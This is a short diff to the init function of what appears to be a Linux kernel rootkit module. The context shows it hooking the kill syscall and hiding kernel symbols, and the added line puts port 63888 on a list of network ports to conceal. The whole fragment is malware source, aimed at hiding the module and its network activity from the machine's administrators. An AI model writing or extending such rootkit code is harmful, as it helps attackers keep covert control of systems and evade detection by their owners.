@@ -288,6 +288,7 @@ static int __init mod_init(void){
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
     }
     hide_ksyms();
+    insert_node(&ports_to_hide, "63888");
     return 0;
 }
 
